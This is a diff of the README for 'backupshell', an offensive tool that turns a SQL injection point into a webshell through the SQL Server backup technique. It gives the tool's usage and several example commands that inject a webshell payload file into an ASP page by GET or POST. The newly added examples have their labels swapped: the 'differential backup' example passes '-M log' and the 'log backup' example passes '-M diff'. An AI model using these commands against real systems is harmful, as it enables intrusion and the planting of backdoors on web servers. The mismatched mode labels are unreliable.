@@ -1,4 +1,4 @@
-# An implement to get shell from Sql Injection point via backup-shell technic.
+# An implement to get shell from Sql Injection point via sqlserver-backup-shell technic.
 ```
 Powered by Brian.W AKA BigCHAN.
 usage: backupshell [-h|--help] -u|--baseUrl "<value>" -m|--method (GET|POST)
@@ -26,15 +26,19 @@ Arguments:
   -M  --mode      The mode to use.
   -c  --combine   Combine the payload to one request.
 ```
-Example1, for GET request:
+Example, get shell with database differential backup:
 ```
 $ backupshell -u http://localhost/test.asp?a={*} -s /tools/payload/webshell.txt -d db1 -b c:\\a.txt -m GET -M log -c 1
 ```
-Example2, for POST request:
+Example, get shell with log backup:
+```
+$ backupshell -u http://localhost/test.asp?a={*} -s /tools/payload/webshell.txt -d db1 -b c:\\a.txt -m GET -M diff -c 1
+```
+Example, for POST request:
 ```
 $ backupshell -u http://localhost/test.asp -s /tools/payload/webshell.txt -d db1 -b c:\\a.txt -m POST -D "a={*}" -M log -c 1
 ```
-Example3, for set up the payload in url param with POST request:
+Example, for set up the payload in url param with POST request:
 ```
 $ backupshell -u http://localhost/test.asp?a={*} -s /tools/payload/webshell.txt -d db1 -b c:\\a.txt -m POST -D "null" -M log -c 1
 ```
